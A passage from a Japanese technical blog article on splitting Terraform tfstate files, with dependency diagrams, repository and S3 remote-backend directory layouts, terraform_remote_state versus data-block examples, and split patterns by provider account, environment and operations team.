『依存』の波線矢印について---\x3e (波線矢印) で表現します。そのため便宜上、tfstateファイルでも同じ記号で表現することにしました\uD83D\uDC4D▼ 依存関係がない場合例えば、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、 tfstate ファイル間に依存関係はないとします。そのため、想定される状態の依存関係図は以下の通りになります。tfstateファイル間に依存関係がない状況がベストです。---title: tfstateファイル間に依存関係はない---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWSアカウント        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end▼ 依存関係がある場合同様に分割したと仮定します。ここで仮定した状況では、 foo-tfstate ➡︎ bar-tfstate の方向に依存しているとします。そのため、---\x3e (波線矢印) を使用して、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: foo-tfstateファイルは、bar-tfstateファイルに依存---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph AWSアカウント        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. 依存 .-> bar04. tfstate ファイルに基づくその他の設計リポジトリ \uD83D\uDC31 の設計リポジトリ分割ここまでで、tfstateファイル分割について簡単に紹介しました。リポジトリの分割は、tfstateファイル分割に基づいて設計しましょう。可能であれば、1個のリポジトリに1個のtfstateファイルをおくことが望ましいです。異なるリポジトリにtfstateファイルをおいた方がよい場合については、分割パターン で説明しています。\uD83D\uDC31 foo-repository/├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する...\uD83D\uDC31 bar-repository/├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する...ディレクトリ \uD83D\uDCC2 構成リポジトリ内のディレクトリ構成も、tfstateファイル分割に基づいて設計しましょう。率直に言うと、Terraformのディレクトリ構成のパターンは無数にあります。そのため、基準なしにディレクトリ構成を考えると何でもあり になってしまいます。その一方で、tfstateファイル分割に基づいて設計することにより、明確なディレクトリ構成パターン として抽出可能になります。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ...▶ ローカルモジュールのディレクトリ構成の設計についてresource、data) のセットを使い回すことを目的とした、ローカルモジュールがあります。今回、これのディレクトリ構成は設計に含めていません。混同しやすいのですが、tfstateファイル分割に基づくディレクトリ構成とローカルモジュール内のそれは、全く別のテーマとして切り離して考えることができます\uD83D\uDC4Dリモートバックエンド \uD83E\uDEA3 の設計リモートバックエンド分割本記事では、リモートバックエンドとしてAWS S3バケットを使用することを想定しています。リモートバックエンドの分割は、tfstateファイル分割に基づいて設計しましょう。異なるリモートバックエンドにtfstateファイルをおいた方がよい場合については、分割パターン で説明しています。\uD83E\uDEA3 foo-bucket/│└── terraform.tfstate # fooコンポーネントの状態を持つ\uD83E\uDEA3 bar-bucket/│└── terraform.tfstate # barコンポーネントの状態を持つディレクトリ構成もし、リモートバックエンドをtfstateファイル分割に基づいて分割しなかったとします。その場合は、代わりにリモートバックエンド内のディレクトリ構成をtfstateファイル分割に基づいて設計しましょう。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo/│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar/      └── terraform.tfstate # barコンポーネントの状態を持つ05. 状態の依存関係の定義方法terraform_remote_stateブロックの場合terraform_remote_stateブロックによる依存terraform_remote_stateブロックには、以下のメリデメがあります。 アーキテクチャ特性  メリット ⭕️                                                                        デメリット \xd7                                                                                                                                                      可読性                 -                                                                                  terraform_remote_stateブロックに加えてoutputブロックも実装が必要であり、outputブロックは依存先のAWSリソースが一見してわかりにくい。                             拡張性                 依存先のAWSリソースに関わらず、同じterraform_remote_stateブロックを使い回せる。  -                                                                                                                                                                     保守性                 -                                                                                  依存先と依存元の間でTerraformのバージョンに差がありすぎると、tfstateファイル間で互換性がなくなり、terraform_remote_stateブロックの処理が失敗する。 本記事では、 terraform_remote_state ブロックを使用して、状態の依存関係を定義 していきます。tfstateファイルが他のtfstateファイルに依存する方法として、後述のAWSリソース別dataブロックがあります。The terraform_remote_state Data Source | Terraform | HashiCorp Developer状態の依存関係図例えば、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、bar-tfstateファイルはVPCの状態を持っており、 foo-tfstate ファイルは bar-tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: terraform_remote_stateブロックを使用した依存関係---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph bucket        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. VPCの状態に依存 .-> barリポジトリのディレクトリ構成tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。ディレクトリの設計方法は、分割パターン で説明しています。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ├── remote_state.tf # terraform_remote_stateブロックを使用し、bar-tfstate ファイルに依存する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ├── output.tf # 他の tfstate ファイルから依存される      ├── provider.tf      ...foo-tfstateファイルがbar-tfstateファイルに依存するために必要な実装は、以下の通りになります。resource \\"example\\" \\"foo\\" {  # fooリソースは、bar-tfstate ファイルのVPCに依存する  vpc_id = data.terraform_remote_state.bar.outputs.bar_vpc_id  ...}data \\"terraform_remote_state\\" \\"bar\\" { backend = \\"s3\\"  config = {    bucket = \\"tfstate\\"    key    = \\"bar/terraform.tfstate\\"    region = \\"ap-northeast-1\\"  }}# VPCの状態は、bar-tfstate ファイルで持つoutput \\"bar_vpc_id\\" {  value = aws_vpc.bar.id}resource \\"aws_vpc\\" \\"bar\\" {  ...}リモートバックエンドのディレクトリ構成tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar      └── terraform.tfstate # barコンポーネントの状態を持つAWSリソース別dataブロックの場合AWSリソース別dataブロックによる依存AWSリソース別dataブロックには、以下のメリデメがあります。 アーキテクチャ特性  メリット ⭕️                                                                                                                                     デメリット \xd7                                                 可読性                 依存先のAWSリソースがわかりやすい。                                                                                                             -                                                                拡張性                 -                                                                                                                                               依存先のAWSリソース別dataブロックが必要である。                保守性                 依存先と依存元の間でTerraformのバージョンに差があっても、tfstateファイル間で直接的に依存するわけではないため、バージョン差の影響を受けない。  -                                                 今回は使用しませんが、依存関係の他の定義方法として、AWSリソース別dataブロックがあります。これは、tfstateファイルが自身以外 (例：コンソール画面、他のtfstateファイル) で作成されたAWSリソースの状態に依存するために使用できます。terraform_remote_stateブロックとは異なり、直接的にはtfstateファイルに依存しません。AWSリソース別dataブロックの場合は、実際のAWSリソースの状態に依存することにより、間接的にAWSリソースのtfstateファイルに依存することになります。Query data from external sources | Terraform | HashiCorp Developer状態の依存関係図例えば、AWSリソース別dataブロックも同様にして、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、bar-tfstateファイルはVPCの状態を持っており、 foo-tfstate ファイルは bar-tfstate ファイルに依存しているとします。想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: dataブロックを使用した依存関係---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph bucket        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. VPCの状態に依存 .-> barリポジトリのディレクトリ構成ディレクトリ構成は、tfstateファイル分割に基づいて、以下の通りになります。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ├── data.tf # dataブロックを使用し、bar-tfstate ファイルに依存する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ├── provider.tf      ...foo-tfstateファイルがbar-tfstateファイルに依存するために必要な実装は、以下の通りになります。# fooリソースの状態は、foo-tfstate ファイルで持つresource \\"example\\" \\"foo\\" {  # fooリソースは、bar-tfstate ファイルのVPCに依存する  vpc_id     = data.aws_vpc.bar.id}# VPCの状態は、bar-tfstate ファイルで持つdata \\"aws_vpc\\" \\"bar\\" {  filter {    name   = \\"tag:Name\\"    values = [\\"<bar-tfstateが持つVPCの名前>\\"]  }}リモートバックエンドのディレクトリ構成tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar      └── terraform.tfstate # barコンポーネントの状態を持つ06. tfstate ファイルの分割パターンオススメな設計の一覧前述の通り、tfstateファイルの分割の境界は、『他の状態にできるだけ依存しないリソースの関係』から見つけることができます。分割しすぎると terraform_remote_stateブロック地獄 になるため、細かすぎず粗すぎない適切な境界を見つけていきましょう。今回は、私が考える分割パターンをいくつか紹介します。全てが実用的なパターンというわけでないため、オススメするものを ★ としています。推奨・任意    tfstate分割パターン大分類    tfstate分割パターン小分類オススメ    対応するリポジトリ構成 \uD83D\uDC31    対応するリモートバックエンド構成 \uD83E\uDEA3  推奨    上層    プロバイダーのアカウント別    ★★★    リポジトリ自体または上層ディレクトリ    リモートバックエンド自体または上層ディレクトリ  下層実行環境別    ★★★    下層ディレクトリ    下層ディレクトリ  任意    中間層    運用チーム責務範囲別    ★★    中間層ディレクトリ    中間層ディレクトリ  プロダクトのサブコンポーネント別    ★★  運用チーム責務範囲別\xd7プロダクトのサブコンポーネント別(組み合わせ)    ★  同じテナント内のプロダクト別      AWSリソースの種類グループ別      AWSリソースの状態の変更頻度グループ別      大分類 (上層/下層/中間層) とディレクトリ構成の関係リポジトリの場合記事内のここ で、リポジトリ内のディレクトリ構成はtfstateファイル分割に基づいて設計するべき、という説明をしました。tfstateファイルの分割パターンは、上層/下層/中間層 の層に大別できます。これらの層は、以下の通りリポジトリ自体・ディレクトリ構成の設計方法に影響します。# リポジトリ自体を分割する場合\uD83D\uDC31 上層/├── \uD83D\uDCC2 中間層/│    ├── \uD83D\uDCC2 下層/│    │    ├── backend.tfvars # 分割された tfstate ファイルを指定する│    │    ...│    │...# リポジトリ内のディレクトリを分割する場合\uD83D\uDC31 リポジトリ/├── \uD83D\uDCC2 上層/│    ├── \uD83D\uDCC2 中間層/│    │    ├── \uD83D\uDCC2 下層/│    │    │    ├── backend.tfvars # 分割された tfstate ファイルを指定する│    │    │    ...│    │    │...リモートバックエンドの場合記事内のここ で、リモートバックエンドのディレクトリ構成についても言及しました。これらの層は、以下の通りリモートバックエンド自体・ディレクトリ構成の設計方法に影響します。# リモートバックエンド自体を分割する場合\uD83E\uDEA3 上層/├── \uD83D\uDCC2 中間層/│    ├── \uD83D\uDCC2 下層/│    │    └── terraform.tfstate # 分割された状態を持つ│    ││    │...# リモートバックエンド内のディレクトリを分割する場合\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 上層/│    ├── \uD83D\uDCC2 中間層/│    │    ├── \uD83D\uDCC2 下層/│    │    │    └── terraform.tfstate # 分割された状態を持つ│    │    ││    │    │...07. 上層の分割 (推奨)上層の分割について上層の分割は 推奨 です。Terraformに携わる管理者の数が少なくても採用した方がよいです。tfstateファイルをパターンに応じて分割し、これに基づいてディレクトリ・リモートバックエンドも設計しましょう。プロバイダーのアカウント別 - ★★★この分割方法について上層分割の中でも、基本的な方法の1つです。プロバイダーのアカウント別にtfstateファイルを分割し、上層もこれに基づいて設計します。この分割方法により、各プロバイダーの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度についてtfstateファイルで状態を管理せざるを得ない場合があります。例えば、Kubernetesのプロバイダーは、EKSと同じtfstateファイルで管理した方がよいです\uD83D\uDC4DTerraform Registry【プロバイダーアカウント別】状態の依存関係図例えば、以下のプロバイダーを使用したい状況と仮定します。主要プロバイダー (AWS)アプリ/インフラ監視プロバイダー (Datadog)ジョブ監視プロバイダー (Healthchecks)インシデント管理プロバイダー (PagerDuty)ここで仮定した状況では、各プロバイダーの tfstate ファイル間で状態が相互に依存しているとします。AWSリソース間の相互依存ではないため、循環参照は起こりません。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: プロバイダーのアカウント別---%%{init:{\'theme\':\'default\'}}%%flowchart LR    subgraph PagerDuty        pagerDuty[\\"tfstate\\"]    end    subgraph Healthchecks        healthchecks[\\"tfstate\\"]    end    subgraph Datadog        datadog[\\"tfstate\\"]    end    subgraph AWS        aws[\\"tfstate\\"]    end    aws -...-> datadog    aws -...-> healthchecks    aws -...-> pagerDuty    datadog -...-> aws    healthchecks -...-> aws    pagerDuty -...-> aws【プロバイダーアカウント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロバイダーアカウント別に分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── backend.tf # AWSの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 datadog-repository/├── backend.tf # Datadogの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 healthchecks-repository/├── backend.tf # Healthchecksの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 pagerduty-repository/├── backend.tf # PagerDutyの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...▼ 同じリポジトリの場合プロバイダーアカウント別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 repository/├── \uD83D\uDCC2 aws/│    ├── backend.tf # AWSの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│├── \uD83D\uDCC2 datadog/│    ├── backend.tf # Datadogの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│├── \uD83D\uDCC2 healthchecks/│    ├── backend.tf # Healthchecksの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 pagerduty/      ├── backend.tf # PagerDutyの状態を持つ tfstate ファイルを指定する      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── provider.tf      ...【プロバイダーアカウント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合プロバイダーアカウント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 aws-bucket/│└── terraform.tfstate # AWSの状態を持つ\uD83E\uDEA3 datadog-bucket/│└── terraform.tfstate # Datadogの状態を持つ\uD83E\uDEA3 healthchecks-bucket/│└── terraform.tfstate # Healthchecksの状態を持つ\uD83E\uDEA3 pagerduty-bucket/│└── terraform.tfstate # PagerDutyの状態を持つ▼ 同じリモートバックエンドの場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 aws│    └── terraform.tfstate # AWSの状態を持つ│├── \uD83D\uDCC2 datadog│    └── terraform.tfstate # Datadogの状態を持つ│├── \uD83D\uDCC2 healthchecks│    └── terraform.tfstate # Healthchecksの状態を持つ│└── \uD83D\uDCC2 pagerduty      └── terraform.tfstate # PagerDutyの状態を持つ08. 下層の分割 (推奨)下層の分割について下層の分割は 推奨 です。Terraformに携わる管理者の数が少なくても採用した方がよいです。tfstateファイルをパターンに応じて分割し、これに基づいてディレクトリ・リモートバックエンドも設計しましょう。実行環境別 - ★★★この分割方法について下層分割の中でも、基本的な方法の1つです。実行環境別にtfstateファイルを分割し、下層もこれに基づいて設計します。この分割方法により、各実行環境の管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Terraform: Up & Running; Writing Infrastructure As CodeGruntwork Blog | How to manage Terraform state▶ おすすめ度について【実行環境別】状態の依存関係図例えば、以下の実行環境を構築したい状況と仮定します。Tes環境 (検証環境)Stg環境 (ユーザー受け入れ環境)Prd環境 (本番環境)かつ、以下のプロバイダーを使用したい状況と仮定します。主要プロバイダー (AWS)アプリ/インフラ監視プロバイダー (Datadog)ジョブ監視プロバイダー (Healthchecks)インシデント管理プロバイダー (PagerDuty)ここで仮定した状況では、各実行環境の tfstate ファイルは他の実行環境には依存していないとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 実行環境別---%%{init:{\'theme\':\'default\'}}%%flowchart LR    subgraph PagerDuty        pagerDuty[\\"tfstate\\"]    end    subgraph Healthchecks        healthchecks[\\"tfstate\\"]    end    subgraph Datadog        datadog[\\"tfstate\\"]    end    subgraph AWS        subgraph tes-bucket            tes[\\"tfstate\\"]        end        subgraph stg-bucket            stg[\\"tfstate\\"]        end        subgraph prd-bucket            prd[\\"tfstate\\"]        end    end    tes -...-> datadog    tes -...-> healthchecks    tes -...-> pagerDuty    datadog -...-> tes    healthchecks -...-> tes    pagerDuty -...-> tes【実行環境別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロバイダーアカウント別にtfstateファイルを分割することは推奨としているため、その上でディレクトリ構成を考えます。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # Tes環境のAWSリソースの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境└── \uD83D\uDCC2 prd/ # Prd環境\uD83D\uDC31 datadog-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # Tes環境のDatadogの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/\uD83D\uDC31 healthchecks-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # HealthchecsのTes環境の状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/\uD83D\uDC31 pagerduty-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # Tes環境のPagerDutyの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/▼ 同じリポジトリの場合プロバイダーアカウント別にtfstateファイルを分割することは推奨としているため、その上でディレクトリ構成を考えます。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 repository/├── \uD83D\uDCC2 aws/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # Tes環境のAWSリソースの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    └── \uD83D\uDCC2 prd/ # Prd環境│├── \uD83D\uDCC2 datadog/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/│    │    ├── backend.tfvars # Tes環境のDatadogの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│├── \uD83D\uDCC2 healthchecks/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/│    │    ├── backend.tfvars # Tes環境のHealthchecksの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│└── \uD83D\uDCC2 pagerduty/      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── provider.tf      ├── \uD83D\uDCC2 tes/      │    ├── backend.tfvars # Tes環境のPagerDutyの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/      └── \uD83D\uDCC2 prd/【実行環境別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合実行環境別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。例えば、前述の依存関係図の状況と仮定します。\uD83E\uDEA3 tes-aws-bucket/│└── terraform.tfstate # Tes環境のAWSリソースの状態を持つ\uD83E\uDEA3 tes-datadog-bucket/│└── terraform.tfstate # Tes環境のDatadogの状態を持つ\uD83E\uDEA3 tes-healthchecks-bucket/│└── terraform.tfstate # Tes環境のHealthchecksの状態を持つ\uD83E\uDEA3 tes-pagerduty-bucket/│└── terraform.tfstate # Tes環境のPagerDutyの状態を持つ▼ 同じリモートバックエンド x AWSアカウント別に異なる実行環境 の場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。また、AWSアカウント別に異なる実行環境を作成していると仮定します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 aws/│    └── terraform.tfstate # Tes環境のAWSリソースの状態を持つ│├── \uD83D\uDCC2 datadog/│    └── terraform.tfstate # Tes環境のDatadogの状態を持つ│├── \uD83D\uDCC2 healthchecks/│    └── terraform.tfstate # Tes環境のHealthchecksの状態を持つ│└── \uD83D\uDCC2 pagerduty/      └── terraform.tfstate # Tes環境のPagerDutyの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...▼ 同じリモートバックエンド x 単一のAWSアカウント内に全ての実行環境 の場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。また、単一のAWSアカウント内に全実行環境を作成しているとします。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 aws/│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    └── terraform.tfstate # Tes環境のAWSリソースの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    └── \uD83D\uDCC2 prd/ # Prd環境│├── \uD83D\uDCC2 datadog/│    ├── \uD83D\uDCC2 tes/│    │    └── terraform.tfstate # Tes環境のDatadogの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│├── \uD83D\uDCC2 healthchecks/│    ├── \uD83D\uDCC2 tes/│    │    └── terraform.tfstate # Tes環境のHealthchecksの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│└── \uD83D\uDCC2 pagerduty/      ├── \uD83D\uDCC2 tes/      │    └── terraform.tfstate # Tes環境のPagerDutyの状態を持つ      │      ├── \uD83D\uDCC2 stg/      └── \uD83D\uDCC2 prd/09. 中間層の分割 (任意)中間層の分割について中間層の分割は 任意 です。Terraformに携わる管理者が多くなるほど、効力を発揮します。運用チーム責務範囲別 - ★★この分割方法について運用チーム (例：アプリチーム、インフラチーム) のAWSリソースの責務範囲別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各運用チームが互いに影響を受けずに、terraformコマンドの結果を得られるようになります。CloudFormation best practices - AWS CloudFormationTerraform in Action (English Edition)▶ おすすめ度について【チーム別】状態の依存関係図例えば、以下の運用チームに分割した状況と仮定します。frontendチーム (アプリのフロントエンド領域担当)backendチーム (アプリのバックエンド領域担当)sreチーム (インフラ領域担当)ここで仮定した状況では、各チームが管理する tfstate ファイル間で状態が相互に依存しているとします。AWSリソース間の相互依存ではないため、循環参照は起こりません。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 運用チーム責務範囲別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            frontend[\\"frontend-team-tfstate<br>(CloudFront, S3, など)\\"]            backend[\\"backend-team-tfstate<br>(API Gateway, ElastiCache, RDS, SES, SNS, など)\\"]            sre[\\"sre-team-tfstate<br>(ALB, CloudWatch, EC2, ECS, EKS, IAM, VPC, など)\\"]            frontend-..->sre            backend-..->sre            sre-..->frontend            sre-..->backend        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【チーム別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、運用チーム責務範囲別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-frontend-team-repository/ # frontendチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── cloudfront.tf├── s3.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する      ...\uD83D\uDC31 aws-backend-team-repository/ # backendチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── elasticache.tf├── ses.tf├── sns.tf├── rds.tf├── \uD83D\uDCC2 tes│    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg│    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd      ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する       ...\uD83D\uDC31 aws-sre-team-repository/ # sreチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── alb.tf├── cloudwatch.tf├── ec2.tf├── ecs.tf├── eks.tf├── iam.tf├── vpc.tf├── \uD83D\uDCC2 tes│    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg│    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd      ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      ...▼ 同じリポジトリの場合この場合では、運用チーム責務範囲別に分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 frontend-team # frontendチーム│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudfront.tf│    ├── s3.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 backend-team # backendチーム│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── elasticache.tf│    ├── ses.tf│    ├── sns.tf│    ├── rds.tf│    ├── \uD83D\uDCC2 tes│    